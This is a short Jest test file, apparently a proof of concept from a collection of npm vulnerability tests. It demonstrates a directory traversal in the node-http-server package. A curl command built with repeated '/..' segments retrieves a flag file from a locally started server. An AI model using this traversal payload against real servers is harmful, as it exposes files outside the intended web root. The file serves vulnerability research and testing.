//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/node-http-server/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in node-http-server", (done) => {
    const pkg = require('node-http-server');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    pkg.deploy({
        port: 8986,
        root: __dirname,
    });
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8986${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
